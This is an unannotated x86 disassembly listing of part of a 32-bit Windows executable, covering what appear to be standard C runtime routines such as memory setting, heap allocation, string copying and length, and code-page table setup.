  403465:	rep stos DWORD PTR es:[edi],eax
  403467:	test   edx,edx
  403469:	je     0x403475
  40346b:	mov    BYTE PTR [edi],al
  40346d:	add    edi,0x1
  403470:	sub    edx,0x1
  403473:	jne    0x40346b
  403475:	mov    eax,DWORD PTR [esp+0x8]
  403479:	pop    edi
  40347a:	ret    
  40347b:	mov    eax,DWORD PTR [esp+0x4]
  40347f:	ret    
  403480:	cmp    DWORD PTR ds:0x428c04,0x3
  403487:	push   esi
  403488:	mov    esi,DWORD PTR [esp+0x8]
  40348c:	jne    0x4034a1
  40348e:	cmp    esi,DWORD PTR ds:0x4289b0
  403494:	ja     0x4034a1
  403496:	push   esi
  403497:	call   0x404728
  40349c:	test   eax,eax
  40349e:	pop    ecx
  40349f:	jne    0x4034c4
  4034a1:	test   esi,esi
  4034a3:	jne    0x4034a6
  4034a5:	inc    esi
  4034a6:	cmp    DWORD PTR ds:0x428c04,0x1
  4034ad:	je     0x4034b5
  4034af:	add    esi,0xf
  4034b2:	and    esi,0xfffffff0
  4034b5:	push   esi
  4034b6:	push   0x0
  4034b8:	push   DWORD PTR ds:0x428c00
  4034be:	call   DWORD PTR ds:0x425090
  4034c4:	pop    esi
  4034c5:	ret    
  4034c6:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4034cb:	ja     0x4034ef
  4034cd:	push   DWORD PTR [esp+0x4]
  4034d1:	call   0x403480
  4034d6:	test   eax,eax
  4034d8:	pop    ecx
  4034d9:	jne    0x4034f1
  4034db:	cmp    DWORD PTR [esp+0x8],eax
  4034df:	je     0x4034f1
  4034e1:	push   DWORD PTR [esp+0x4]
  4034e5:	call   0x404ee2
  4034ea:	test   eax,eax
  4034ec:	pop    ecx
  4034ed:	jne    0x4034cd
  4034ef:	xor    eax,eax
  4034f1:	ret    
  4034f2:	push   DWORD PTR ds:0x427974
  4034f8:	push   DWORD PTR [esp+0x8]
  4034fc:	call   0x4034c6
  403501:	pop    ecx
  403502:	pop    ecx
  403503:	ret    
  403504:	push   ebp
  403505:	mov    ebp,esp
  403507:	sub    esp,0x48
  40350a:	push   ebx
  40350b:	push   esi
  40350c:	push   edi
  40350d:	push   0x4
  40350f:	pop    eax
  403510:	call   0x4030f0
  403515:	mov    ebx,esp
  403517:	push   0x1c
  403519:	lea    eax,[ebp-0x24]
  40351c:	push   eax
  40351d:	push   ebx
  40351e:	call   DWORD PTR ds:0x42509c
  403524:	test   eax,eax
  403526:	je     0x403599
  403528:	mov    edi,DWORD PTR [ebp-0x20]
  40352b:	lea    eax,[ebp-0x48]
  40352e:	push   eax
  40352f:	call   DWORD PTR ds:0x425098
  403535:	mov    eax,DWORD PTR [ebp-0x44]
  403538:	lea    esi,[eax-0x1]
  40353b:	not    esi
  40353d:	and    esi,ebx
  40353f:	sub    esi,eax
  403541:	mov    DWORD PTR [ebp-0x4],eax
  403544:	mov    eax,ds:0x4277d8
  403549:	mov    ecx,eax
  40354b:	dec    ecx
  40354c:	neg    ecx
  40354e:	sbb    ecx,ecx
  403550:	and    ecx,0xffff1000
  403556:	add    ecx,0x11000
  40355c:	add    ecx,edi
  40355e:	cmp    esi,ecx
  403560:	jb     0x403599
  403562:	cmp    eax,0x1
  403565:	je     0x4035b1
  403567:	mov    ebx,edi
  403569:	mov    edi,0x1000
  40356e:	push   0x1c
  403570:	lea    eax,[ebp-0x24]
  403573:	push   eax
  403574:	push   ebx
  403575:	call   DWORD PTR ds:0x42509c
  40357b:	test   eax,eax
  40357d:	je     0x403599
  40357f:	add    ebx,DWORD PTR [ebp-0x18]
  403582:	test   DWORD PTR [ebp-0x14],edi
  403585:	je     0x40356e
  403587:	test   BYTE PTR [ebp-0xf],0x1
  40358b:	mov    ebx,DWORD PTR [ebp-0x24]
  40358e:	je     0x403595
  403590:	xor    eax,eax
  403592:	inc    eax
  403593:	jmp    0x4035cd
  403595:	cmp    esi,ebx
  403597:	jae    0x40359d
  403599:	xor    eax,eax
  40359b:	jmp    0x4035cd
  40359d:	push   0x4
  40359f:	push   edi
  4035a0:	push   DWORD PTR [ebp-0x4]
  4035a3:	push   ebx
  4035a4:	call   DWORD PTR ds:0x425024
  4035aa:	mov    eax,ds:0x4277d8
  4035af:	jmp    0x4035b3
  4035b1:	mov    ebx,esi
  4035b3:	dec    eax
  4035b4:	neg    eax
  4035b6:	sbb    eax,eax
  4035b8:	and    eax,0x103
  4035bd:	lea    ecx,[ebp-0x8]
  4035c0:	push   ecx
  4035c1:	inc    eax
  4035c2:	push   eax
  4035c3:	push   DWORD PTR [ebp-0x4]
  4035c6:	push   ebx
  4035c7:	call   DWORD PTR ds:0x425094
  4035cd:	lea    esp,[ebp-0x54]
  4035d0:	pop    edi
  4035d1:	pop    esi
  4035d2:	pop    ebx
  4035d3:	leave  
  4035d4:	ret    
  4035d5:	push   0x8
  4035d7:	push   0x4258e0
  4035dc:	call   0x4030a4
  4035e1:	and    DWORD PTR [ebp-0x4],0x0
  4035e5:	push   0x0
  4035e7:	push   0x1
  4035e9:	call   0x404f5c
  4035ee:	pop    ecx
  4035ef:	pop    ecx
  4035f0:	jmp    0x4035f9
  4035f2:	xor    eax,eax
  4035f4:	inc    eax
  4035f5:	ret    
  4035f6:	mov    esp,DWORD PTR [ebp-0x18]
  4035f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4035fd:	push   0x3
  4035ff:	call   DWORD PTR ds:0x425048
  403605:	int3   
  403606:	cmp    ecx,DWORD PTR ds:0x4272a8
  40360c:	jne    0x40360f
  40360e:	ret    
  40360f:	jmp    0x4035d5
  403614:	int3   
  403615:	int3   
  403616:	int3   
  403617:	int3   
  403618:	int3   
  403619:	int3   
  40361a:	int3   
  40361b:	int3   
  40361c:	int3   
  40361d:	int3   
  40361e:	int3   
  40361f:	int3   
  403620:	mov    eax,DWORD PTR [esp+0x8]
  403624:	mov    ecx,DWORD PTR [esp+0x10]
  403628:	or     ecx,eax
  40362a:	mov    ecx,DWORD PTR [esp+0xc]
  40362e:	jne    0x403639
  403630:	mov    eax,DWORD PTR [esp+0x4]
  403634:	mul    ecx
  403636:	ret    0x10
  403639:	push   ebx
  40363a:	mul    ecx
  40363c:	mov    ebx,eax
  40363e:	mov    eax,DWORD PTR [esp+0x8]
  403642:	mul    DWORD PTR [esp+0x14]
  403646:	add    ebx,eax
  403648:	mov    eax,DWORD PTR [esp+0x8]
  40364c:	mul    ecx
  40364e:	add    edx,ebx
  403650:	pop    ebx
  403651:	ret    0x10
  403654:	push   esi
  403655:	push   DWORD PTR ds:0x428d28
  40365b:	call   0x405208
  403660:	pop    ecx
  403661:	mov    ecx,DWORD PTR ds:0x428d24
  403667:	mov    esi,eax
  403669:	mov    eax,ds:0x428d28
  40366e:	mov    edx,ecx
  403670:	sub    edx,eax
  403672:	add    edx,0x4
  403675:	cmp    esi,edx
  403677:	jae    0x4036c7
  403679:	mov    ecx,0x800
  40367e:	cmp    esi,ecx
  403680:	jae    0x403684
  403682:	mov    ecx,esi
  403684:	add    ecx,esi
  403686:	push   ecx
  403687:	push   eax
  403688:	call   0x4050a6
  40368d:	test   eax,eax
  40368f:	pop    ecx
  403690:	pop    ecx
  403691:	jne    0x4036aa
  403693:	add    esi,0x10
  403696:	push   esi
  403697:	push   DWORD PTR ds:0x428d28
  40369d:	call   0x4050a6
  4036a2:	test   eax,eax
  4036a4:	pop    ecx
  4036a5:	pop    ecx
  4036a6:	jne    0x4036aa
  4036a8:	pop    esi
  4036a9:	ret    
  4036aa:	mov    ecx,DWORD PTR ds:0x428d24
  4036b0:	sub    ecx,DWORD PTR ds:0x428d28
  4036b6:	mov    ds:0x428d28,eax
  4036bb:	sar    ecx,0x2
  4036be:	lea    ecx,[eax+ecx*4]
  4036c1:	mov    DWORD PTR ds:0x428d24,ecx
  4036c7:	mov    eax,DWORD PTR [esp+0x8]
  4036cb:	mov    DWORD PTR [ecx],eax
  4036cd:	add    DWORD PTR ds:0x428d24,0x4
  4036d4:	pop    esi
  4036d5:	ret    
  4036d6:	push   DWORD PTR [esp+0x4]
  4036da:	call   0x403654
  4036df:	neg    eax
  4036e1:	sbb    eax,eax
  4036e3:	neg    eax
  4036e5:	pop    ecx
  4036e6:	dec    eax
  4036e7:	ret    
  4036e8:	push   0x80
  4036ed:	call   0x4034f2
  4036f2:	test   eax,eax
  4036f4:	pop    ecx
  4036f5:	mov    ds:0x428d28,eax
  4036fa:	jne    0x403700
  4036fc:	push   0x18
  4036fe:	pop    eax
  4036ff:	ret    
  403700:	and    DWORD PTR [eax],0x0
  403703:	mov    eax,ds:0x428d28
  403708:	mov    ds:0x428d24,eax
  40370d:	xor    eax,eax
  40370f:	ret    
  403710:	push   ebp
  403711:	mov    ebp,esp
  403713:	sub    esp,0x10
  403716:	push   ebx
  403717:	xor    ebx,ebx
  403719:	cmp    DWORD PTR ds:0x427934,ebx
  40371f:	push   esi
  403720:	push   edi
  403721:	jne    0x403790
  403723:	push   0x425950
  403728:	call   DWORD PTR ds:0x425018
  40372e:	mov    edi,eax
  403730:	cmp    edi,ebx
  403732:	je     0x4037cb
  403738:	mov    esi,DWORD PTR ds:0x425014
  40373e:	push   0x425944
  403743:	push   edi
  403744:	call   esi
  403746:	test   eax,eax
  403748:	mov    ds:0x427934,eax
  40374d:	je     0x4037cb
  40374f:	push   0x425934
  403754:	push   edi
  403755:	call   esi
  403757:	push   0x425920
  40375c:	push   edi
  40375d:	mov    ds:0x427938,eax
  403762:	call   esi
  403764:	cmp    DWORD PTR ds:0x4277d8,0x2
  40376b:	mov    ds:0x42793c,eax
  403770:	jne    0x403790
  403772:	push   0x425904
  403777:	push   edi
  403778:	call   esi
  40377a:	test   eax,eax
  40377c:	mov    ds:0x427944,eax
  403781:	je     0x403790
  403783:	push   0x4258ec
  403788:	push   edi
  403789:	call   esi
  40378b:	mov    ds:0x427940,eax
  403790:	mov    eax,ds:0x427940
  403795:	test   eax,eax
  403797:	je     0x4037d5
  403799:	call   eax
  40379b:	test   eax,eax
  40379d:	je     0x4037bc
  40379f:	lea    ecx,[ebp-0x4]
  4037a2:	push   ecx
  4037a3:	push   0xc
  4037a5:	lea    ecx,[ebp-0x10]
  4037a8:	push   ecx
  4037a9:	push   0x1
  4037ab:	push   eax
  4037ac:	call   DWORD PTR ds:0x427944
  4037b2:	test   eax,eax
  4037b4:	je     0x4037bc
  4037b6:	test   BYTE PTR [ebp-0x8],0x1
  4037ba:	jne    0x4037d5
  4037bc:	cmp    DWORD PTR ds:0x4277e4,0x4
  4037c3:	jb     0x4037cf
  4037c5:	or     BYTE PTR [ebp+0x12],0x20
  4037c9:	jmp    0x4037f4
  4037cb:	xor    eax,eax
  4037cd:	jmp    0x403804
  4037cf:	or     BYTE PTR [ebp+0x12],0x4
  4037d3:	jmp    0x4037f4
  4037d5:	mov    eax,ds:0x427938
  4037da:	test   eax,eax
  4037dc:	je     0x4037f4
  4037de:	call   eax
  4037e0:	mov    ebx,eax
  4037e2:	test   ebx,ebx
  4037e4:	je     0x4037f4
  4037e6:	mov    eax,ds:0x42793c
  4037eb:	test   eax,eax
  4037ed:	je     0x4037f4
  4037ef:	push   ebx
  4037f0:	call   eax
  4037f2:	mov    ebx,eax
  4037f4:	push   DWORD PTR [ebp+0x10]
  4037f7:	push   DWORD PTR [ebp+0xc]
  4037fa:	push   DWORD PTR [ebp+0x8]
  4037fd:	push   ebx
  4037fe:	call   DWORD PTR ds:0x427934
  403804:	pop    edi
  403805:	pop    esi
  403806:	pop    ebx
  403807:	leave  
  403808:	ret    
  403809:	int3   
  40380a:	int3   
  40380b:	int3   
  40380c:	int3   
  40380d:	int3   
  40380e:	int3   
  40380f:	int3   
  403810:	push   edi
  403811:	mov    edi,DWORD PTR [esp+0x8]
  403815:	jmp    0x403885
  403817:	lea    esp,[esp+0x0]
  40381e:	mov    edi,edi
  403820:	mov    ecx,DWORD PTR [esp+0x4]
  403824:	push   edi
  403825:	test   ecx,0x3
  40382b:	je     0x403840
  40382d:	mov    al,BYTE PTR [ecx]
  40382f:	add    ecx,0x1
  403832:	test   al,al
  403834:	je     0x403873
  403836:	test   ecx,0x3
  40383c:	jne    0x40382d
  40383e:	mov    edi,edi
  403840:	mov    eax,DWORD PTR [ecx]
  403842:	mov    edx,0x7efefeff
  403847:	add    edx,eax
  403849:	xor    eax,0xffffffff
  40384c:	xor    eax,edx
  40384e:	add    ecx,0x4
  403851:	test   eax,0x81010100
  403856:	je     0x403840
  403858:	mov    eax,DWORD PTR [ecx-0x4]
  40385b:	test   al,al
  40385d:	je     0x403882
  40385f:	test   ah,ah
  403861:	je     0x40387d
  403863:	test   eax,0xff0000
  403868:	je     0x403878
  40386a:	test   eax,0xff000000
  40386f:	je     0x403873
  403871:	jmp    0x403840
  403873:	lea    edi,[ecx-0x1]
  403876:	jmp    0x403885
  403878:	lea    edi,[ecx-0x2]
  40387b:	jmp    0x403885
  40387d:	lea    edi,[ecx-0x3]
  403880:	jmp    0x403885
  403882:	lea    edi,[ecx-0x4]
  403885:	mov    ecx,DWORD PTR [esp+0xc]
  403889:	test   ecx,0x3
  40388f:	je     0x4038ae
  403891:	mov    dl,BYTE PTR [ecx]
  403893:	add    ecx,0x1
  403896:	test   dl,dl
  403898:	je     0x403900
  40389a:	mov    BYTE PTR [edi],dl
  40389c:	add    edi,0x1
  40389f:	test   ecx,0x3
  4038a5:	jne    0x403891
  4038a7:	jmp    0x4038ae
  4038a9:	mov    DWORD PTR [edi],edx
  4038ab:	add    edi,0x4
  4038ae:	mov    edx,0x7efefeff
  4038b3:	mov    eax,DWORD PTR [ecx]
  4038b5:	add    edx,eax
  4038b7:	xor    eax,0xffffffff
  4038ba:	xor    eax,edx
  4038bc:	mov    edx,DWORD PTR [ecx]
  4038be:	add    ecx,0x4
  4038c1:	test   eax,0x81010100
  4038c6:	je     0x4038a9
  4038c8:	test   dl,dl
  4038ca:	je     0x403900
  4038cc:	test   dh,dh
  4038ce:	je     0x4038f7
  4038d0:	test   edx,0xff0000
  4038d6:	je     0x4038ea
  4038d8:	test   edx,0xff000000
  4038de:	je     0x4038e2
  4038e0:	jmp    0x4038a9
  4038e2:	mov    DWORD PTR [edi],edx
  4038e4:	mov    eax,DWORD PTR [esp+0x8]
  4038e8:	pop    edi
  4038e9:	ret    
  4038ea:	mov    WORD PTR [edi],dx
  4038ed:	mov    eax,DWORD PTR [esp+0x8]
  4038f1:	mov    BYTE PTR [edi+0x2],0x0
  4038f5:	pop    edi
  4038f6:	ret    
  4038f7:	mov    WORD PTR [edi],dx
  4038fa:	mov    eax,DWORD PTR [esp+0x8]
  4038fe:	pop    edi
  4038ff:	ret    
  403900:	mov    BYTE PTR [edi],dl
  403902:	mov    eax,DWORD PTR [esp+0x8]
  403906:	pop    edi
  403907:	ret    
  403908:	int3   
  403909:	int3   
  40390a:	int3   
  40390b:	int3   
  40390c:	int3   
  40390d:	int3   
  40390e:	int3   
  40390f:	int3   
  403910:	mov    ecx,DWORD PTR [esp+0xc]
  403914:	push   edi
  403915:	test   ecx,ecx
  403917:	je     0x4039af
  40391d:	push   esi
  40391e:	push   ebx
  40391f:	mov    ebx,ecx
  403921:	mov    esi,DWORD PTR [esp+0x14]
  403925:	test   esi,0x3
  40392b:	mov    edi,DWORD PTR [esp+0x10]
  40392f:	jne    0x40393c
  403931:	shr    ecx,0x2
  403934:	jne    0x4039bf
  40393a:	jmp    0x403963
  40393c:	mov    al,BYTE PTR [esi]
  40393e:	add    esi,0x1
  403941:	mov    BYTE PTR [edi],al
  403943:	add    edi,0x1
  403946:	sub    ecx,0x1
  403949:	je     0x403976
  40394b:	test   al,al
  40394d:	je     0x40397e
  40394f:	test   esi,0x3
  403955:	jne    0x40393c
  403957:	mov    ebx,ecx
  403959:	shr    ecx,0x2
  40395c:	jne    0x4039bf
  40395e:	and    ebx,0x3
  403961:	je     0x403976
  403963:	mov    al,BYTE PTR [esi]
  403965:	add    esi,0x1
  403968:	mov    BYTE PTR [edi],al
  40396a:	add    edi,0x1
  40396d:	test   al,al
  40396f:	je     0x4039a8
  403971:	sub    ebx,0x1
  403974:	jne    0x403963
  403976:	mov    eax,DWORD PTR [esp+0x10]
  40397a:	pop    ebx
  40397b:	pop    esi
  40397c:	pop    edi
  40397d:	ret    
  40397e:	test   edi,0x3
  403984:	je     0x40399c
  403986:	mov    BYTE PTR [edi],al
  403988:	add    edi,0x1
  40398b:	sub    ecx,0x1
  40398e:	je     0x403a2c
  403994:	test   edi,0x3
  40399a:	jne    0x403986
  40399c:	mov    ebx,ecx
  40399e:	shr    ecx,0x2
  4039a1:	jne    0x403a17
  4039a3:	mov    BYTE PTR [edi],al
  4039a5:	add    edi,0x1
  4039a8:	sub    ebx,0x1
  4039ab:	jne    0x4039a3
  4039ad:	pop    ebx
  4039ae:	pop    esi
  4039af:	mov    eax,DWORD PTR [esp+0x8]
  4039b3:	pop    edi
  4039b4:	ret    
  4039b5:	mov    DWORD PTR [edi],edx
  4039b7:	add    edi,0x4
  4039ba:	sub    ecx,0x1
  4039bd:	je     0x40395e
  4039bf:	mov    edx,0x7efefeff
  4039c4:	mov    eax,DWORD PTR [esi]
  4039c6:	add    edx,eax
  4039c8:	xor    eax,0xffffffff
  4039cb:	xor    eax,edx
  4039cd:	mov    edx,DWORD PTR [esi]
  4039cf:	add    esi,0x4
  4039d2:	test   eax,0x81010100
  4039d7:	je     0x4039b5
  4039d9:	test   dl,dl
  4039db:	je     0x403a09
  4039dd:	test   dh,dh
  4039df:	je     0x4039ff
  4039e1:	test   edx,0xff0000
  4039e7:	je     0x4039f5
  4039e9:	test   edx,0xff000000
  4039ef:	jne    0x4039b5
  4039f1:	mov    DWORD PTR [edi],edx
  4039f3:	jmp    0x403a0d
  4039f5:	and    edx,0xffff
  4039fb:	mov    DWORD PTR [edi],edx
  4039fd:	jmp    0x403a0d
  4039ff:	and    edx,0xff
  403a05:	mov    DWORD PTR [edi],edx
  403a07:	jmp    0x403a0d
  403a09:	xor    edx,edx
  403a0b:	mov    DWORD PTR [edi],edx
  403a0d:	add    edi,0x4
  403a10:	xor    eax,eax
  403a12:	sub    ecx,0x1
  403a15:	je     0x403a23
  403a17:	xor    eax,eax
  403a19:	mov    DWORD PTR [edi],eax
  403a1b:	add    edi,0x4
  403a1e:	sub    ecx,0x1
  403a21:	jne    0x403a19
  403a23:	and    ebx,0x3
  403a26:	jne    0x4039a3
  403a2c:	mov    eax,DWORD PTR [esp+0x10]
  403a30:	pop    ebx
  403a31:	pop    esi
  403a32:	pop    edi
  403a33:	ret    
  403a34:	int3   
  403a35:	int3   
  403a36:	int3   
  403a37:	int3   
  403a38:	int3   
  403a39:	int3   
  403a3a:	int3   
  403a3b:	int3   
  403a3c:	int3   
  403a3d:	int3   
  403a3e:	int3   
  403a3f:	int3   
  403a40:	mov    ecx,DWORD PTR [esp+0x4]
  403a44:	test   ecx,0x3
  403a4a:	je     0x403a70
  403a4c:	mov    al,BYTE PTR [ecx]
  403a4e:	add    ecx,0x1
  403a51:	test   al,al
  403a53:	je     0x403aa3
  403a55:	test   ecx,0x3
  403a5b:	jne    0x403a4c
  403a5d:	add    eax,0x0
  403a62:	lea    esp,[esp+0x0]
  403a69:	lea    esp,[esp+0x0]
  403a70:	mov    eax,DWORD PTR [ecx]
  403a72:	mov    edx,0x7efefeff
  403a77:	add    edx,eax
  403a79:	xor    eax,0xffffffff
  403a7c:	xor    eax,edx
  403a7e:	add    ecx,0x4
  403a81:	test   eax,0x81010100
  403a86:	je     0x403a70
  403a88:	mov    eax,DWORD PTR [ecx-0x4]
  403a8b:	test   al,al
  403a8d:	je     0x403ac1
  403a8f:	test   ah,ah
  403a91:	je     0x403ab7
  403a93:	test   eax,0xff0000
  403a98:	je     0x403aad
  403a9a:	test   eax,0xff000000
  403a9f:	je     0x403aa3
  403aa1:	jmp    0x403a70
  403aa3:	lea    eax,[ecx-0x1]
  403aa6:	mov    ecx,DWORD PTR [esp+0x4]
  403aaa:	sub    eax,ecx
  403aac:	ret    
  403aad:	lea    eax,[ecx-0x2]
  403ab0:	mov    ecx,DWORD PTR [esp+0x4]
  403ab4:	sub    eax,ecx
  403ab6:	ret    
  403ab7:	lea    eax,[ecx-0x3]
  403aba:	mov    ecx,DWORD PTR [esp+0x4]
  403abe:	sub    eax,ecx
  403ac0:	ret    
  403ac1:	lea    eax,[ecx-0x4]
  403ac4:	mov    ecx,DWORD PTR [esp+0x4]
  403ac8:	sub    eax,ecx
  403aca:	ret    
  403acb:	movzx  eax,BYTE PTR [esp+0x4]
  403ad0:	mov    cl,BYTE PTR [esp+0xc]
  403ad4:	test   BYTE PTR [eax+0x4289e1],cl
  403ada:	jne    0x403af8
  403adc:	cmp    DWORD PTR [esp+0x8],0x0
  403ae1:	je     0x403af1
  403ae3:	movzx  eax,WORD PTR [eax*2+0x4254d2]
  403aeb:	and    eax,DWORD PTR [esp+0x8]
  403aef:	jmp    0x403af3
  403af1:	xor    eax,eax
  403af3:	test   eax,eax
  403af5:	jne    0x403af8
  403af7:	ret    
  403af8:	xor    eax,eax
  403afa:	inc    eax
  403afb:	ret    
  403afc:	push   0x4
  403afe:	push   0x0
  403b00:	push   DWORD PTR [esp+0xc]
  403b04:	call   0x403acb
  403b09:	add    esp,0xc
  403b0c:	ret    
  403b0d:	sub    eax,0x3a4
  403b12:	je     0x403b36
  403b14:	sub    eax,0x4
  403b17:	je     0x403b30
  403b19:	sub    eax,0xd
  403b1c:	je     0x403b2a
  403b1e:	dec    eax
  403b1f:	je     0x403b24
  403b21:	xor    eax,eax
  403b23:	ret    
  403b24:	mov    eax,0x404
  403b29:	ret    
  403b2a:	mov    eax,0x412
  403b2f:	ret    
  403b30:	mov    eax,0x804
  403b35:	ret    
  403b36:	mov    eax,0x411
  403b3b:	ret    
  403b3c:	push   edi
  403b3d:	push   0x40
  403b3f:	xor    eax,eax
  403b41:	pop    ecx
  403b42:	mov    edi,0x4289e0
  403b47:	rep stos DWORD PTR es:[edi],eax
  403b49:	stos   BYTE PTR es:[edi],al
  403b4a:	xor    eax,eax
  403b4c:	mov    ds:0x428ae4,eax
  403b51:	mov    ds:0x4289c4,eax
  403b56:	mov    ds:0x4289c0,eax
  403b5b:	mov    edi,0x428af0
  403b60:	stos   DWORD PTR es:[edi],eax
  403b61:	stos   DWORD PTR es:[edi],eax
  403b62:	stos   DWORD PTR es:[edi],eax
  403b63:	pop    edi
  403b64:	ret    
  403b65:	push   ebp
  403b66:	mov    ebp,esp
  403b68:	sub    esp,0x518
  403b6e:	mov    eax,ds:0x4272a8
  403b73:	xor    eax,DWORD PTR [ebp+0x4]
  403b76:	push   esi
  403b77:	mov    DWORD PTR [ebp-0x4],eax
  403b7a:	lea    eax,[ebp-0x18]
  403b7d:	push   eax
  403b7e:	push   DWORD PTR ds:0x428ae4
  403b84:	call   DWORD PTR ds:0x4250a8
  403b8a:	cmp    eax,0x1
  403b8d:	mov    esi,0x100
  403b92:	jne    0x403ca5
  403b98:	xor    eax,eax
  403b9a:	mov    BYTE PTR [ebp+eax*1-0x118],al
  403ba1:	inc    eax
  403ba2:	cmp    eax,esi
  403ba4:	jb     0x403b9a
  403ba6:	mov    al,BYTE PTR [ebp-0x12]
  403ba9:	test   al,al
  403bab:	mov    BYTE PTR [ebp-0x118],0x20
  403bb2:	je     0x403bea
  403bb4:	push   ebx
  403bb5:	lea    edx,[ebp-0x11]
  403bb8:	push   edi
  403bb9:	movzx  ecx,BYTE PTR [edx]
  403bbc:	movzx  eax,al
  403bbf:	cmp    eax,ecx
  403bc1:	ja     0x403be0
  403bc3:	sub    ecx,eax
  403bc5:	inc    ecx
  403bc6:	mov    ebx,ecx
  403bc8:	shr    ecx,0x2
  403bcb:	lea    edi,[ebp+eax*1-0x118]
  403bd2:	mov    eax,0x20202020
  403bd7:	rep stos DWORD PTR es:[edi],eax
  403bd9:	mov    ecx,ebx
  403bdb:	and    ecx,0x3
  403bde:	rep stos BYTE PTR es:[edi],al
  403be0:	inc    edx
  403be1:	mov    al,BYTE PTR [edx]
  403be3:	inc    edx
  403be4:	test   al,al
  403be6:	jne    0x403bb9
  403be8:	pop    edi
  403be9:	pop    ebx
  403bea:	push   0x0
  403bec:	push   DWORD PTR ds:0x4289c0
  403bf2:	lea    eax,[ebp-0x518]
  403bf8:	push   DWORD PTR ds:0x428ae4
  403bfe:	push   eax
  403bff:	push   esi
  403c00:	lea    eax,[ebp-0x118]
  403c06:	push   eax
  403c07:	push   0x1
  403c09:	call   0x404b04
  403c0e:	push   0x0
  403c10:	push   DWORD PTR ds:0x428ae4
  403c16:	lea    eax,[ebp-0x218]
  403c1c:	push   esi
  403c1d:	push   eax
  403c1e:	push   esi
  403c1f:	lea    eax,[ebp-0x118]
  403c25:	push   eax
  403c26:	push   esi
  403c27:	push   DWORD PTR ds:0x4289c0
  403c2d:	call   0x405240
  403c32:	push   0x0
  403c34:	push   DWORD PTR ds:0x428ae4
  403c3a:	lea    eax,[ebp-0x318]
  403c40:	push   esi
  403c41:	push   eax
  403c42:	push   esi
  403c43:	lea    eax,[ebp-0x118]
  403c49:	push   eax
  403c4a:	push   0x200
  403c4f:	push   DWORD PTR ds:0x4289c0
  403c55:	call   0x405240
  403c5a:	add    esp,0x5c
  403c5d:	xor    eax,eax
  403c5f:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  403c67:	test   cl,0x1
  403c6a:	je     0x403c82
  403c6c:	or     BYTE PTR [eax+0x4289e1],0x10
  403c73:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  403c7a:	mov    BYTE PTR [eax+0x428b00],cl
  403c80:	jmp    0x403c9e
  403c82:	test   cl,0x2
  403c85:	je     0x403c97
  403c87:	or     BYTE PTR [eax+0x4289e1],0x20
  403c8e:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  403c95:	jmp    0x403c7a
  403c97:	and    BYTE PTR [eax+0x428b00],0x0
  403c9e:	inc    eax
  403c9f:	cmp    eax,esi
  403ca1:	jb     0x403c5f
  403ca3:	jmp    0x403ce9
  403ca5:	xor    eax,eax
  403ca7:	cmp    eax,0x41
  403caa:	jb     0x403cc5
  403cac:	cmp    eax,0x5a
  403caf:	ja     0x403cc5
  403cb1:	or     BYTE PTR [eax+0x4289e1],0x10
  403cb8:	mov    cl,al
  403cba:	add    cl,0x20
  403cbd:	mov    BYTE PTR [eax+0x428b00],cl
  403cc3:	jmp    0x403ce4
  403cc5:	cmp    eax,0x61
  403cc8:	jb     0x403cdd
  403cca:	cmp    eax,0x7a
  403ccd:	ja     0x403cdd
  403ccf:	or     BYTE PTR [eax+0x4289e1],0x20
  403cd6:	mov    cl,al
  403cd8:	sub    cl,0x20
  403cdb:	jmp    0x403cbd
  403cdd:	and    BYTE PTR [eax+0x428b00],0x0
  403ce4:	inc    eax
  403ce5:	cmp    eax,esi
  403ce7:	jb     0x403ca7
  403ce9:	mov    ecx,DWORD PTR [ebp-0x4]
  403cec:	xor    ecx,DWORD PTR [ebp+0x4]
  403cef:	pop    esi
  403cf0:	call   0x403606
  403cf5:	leave  
  403cf6:	ret    
  403cf7:	push   ebp
  403cf8:	mov    ebp,esp
  403cfa:	sub    esp,0x1c
  403cfd:	mov    eax,ds:0x4272a8
  403d02:	xor    eax,DWORD PTR [ebp+0x4]
  403d05:	push   ebx
  403d06:	push   esi
  403d07:	mov    esi,DWORD PTR [ebp+0x8]
  403d0a:	xor    ebx,ebx
  403d0c:	cmp    esi,0xfffffffe
  403d0f:	mov    DWORD PTR [ebp-0x4],eax
  403d12:	push   edi
  403d13:	mov    DWORD PTR ds:0x427948,ebx
  403d19:	jne    0x403d2d
  403d1b:	mov    DWORD PTR ds:0x427948,0x1
  403d25:	call   DWORD PTR ds:0x4250a4
  403d2b:	jmp    0x403d58
  403d2d:	cmp    esi,0xfffffffd
  403d30:	jne    0x403d44
  403d32:	mov    DWORD PTR ds:0x427948,0x1
  403d3c:	call   DWORD PTR ds:0x4250a0
  403d42:	jmp    0x403d58
  403d44:	cmp    esi,0xfffffffc
  403d47:	jne    0x403d5d
  403d49:	mov    eax,ds:0x427968
  403d4e:	mov    DWORD PTR ds:0x427948,0x1
  403d58:	mov    DWORD PTR [ebp+0x8],eax
  403d5b:	mov    esi,eax
  403d5d:	cmp    esi,DWORD PTR ds:0x428ae4
  403d63:	je     0x403ecc
  403d69:	cmp    esi,ebx
  403d6b:	je     0x403ec2
  403d71:	xor    edx,edx
  403d73:	xor    eax,eax
  403d75:	cmp    DWORD PTR [eax+0x4272b8],esi
  403d7b:	je     0x403de4
  403d7d:	add    eax,0x30
  403d80:	inc    edx
  403d81:	cmp    eax,0xf0
  403d86:	jb     0x403d75
  403d88:	lea    eax,[ebp-0x1c]
  403d8b:	push   eax
  403d8c:	push   esi
  403d8d:	call   DWORD PTR ds:0x4250a8
  403d93:	cmp    eax,0x1
  403d96:	jne    0x403eba
  403d9c:	push   0x40
  403d9e:	xor    eax,eax
  403da0:	pop    ecx
  403da1:	mov    edi,0x4289e0
  403da6:	rep stos DWORD PTR es:[edi],eax
  403da8:	stos   BYTE PTR es:[edi],al
  403da9:	xor    edi,edi
  403dab:	inc    edi
  403dac:	cmp    DWORD PTR [ebp-0x1c],edi
  403daf:	mov    DWORD PTR ds:0x428ae4,esi
  403db5:	mov    DWORD PTR ds:0x4289c0,ebx
  403dbb:	jbe    0x403ea8
  403dc1:	cmp    BYTE PTR [ebp-0x16],0x0
  403dc5:	je     0x403e83
  403dcb:	lea    ecx,[ebp-0x15]
  403dce:	mov    dl,BYTE PTR [ecx]
  403dd0:	test   dl,dl
  403dd2:	je     0x403e83
  403dd8:	movzx  eax,BYTE PTR [ecx-0x1]
  403ddc:	movzx  edx,dl
  403ddf:	jmp    0x403e73
